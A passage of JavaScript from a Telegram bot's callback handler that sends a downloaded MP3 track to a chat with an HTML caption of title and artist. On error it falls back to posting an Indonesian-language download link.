      timeout: 120000
    })
    const mp3Buffer = Buffer.from(fileResp.data)

    await bot.sendAudio(chatId, mp3Buffer, {
      caption: `⎙ <b>${escapeHtml(track.title)}</b>\n⸙ <i>${escapeHtml(track.artist)}</i>`,
      title: track.title,
      performer: track.artist,
      parse_mode: "HTML",
      thumb: track.thumbnail || track.artwork_url || undefined
    })

    await bot.deleteMessage(chatId, query.message.message_id).catch(() => {})
  } catch (err) {
    return bot.sendMessage(
      chatId,
      `⸙ <b>${escapeHtml(track.title)}</b>\n<a href="${mp3Link}">Klik untuk download</a>`,
      { parse_mode: "HTML" }
    )
  }
})
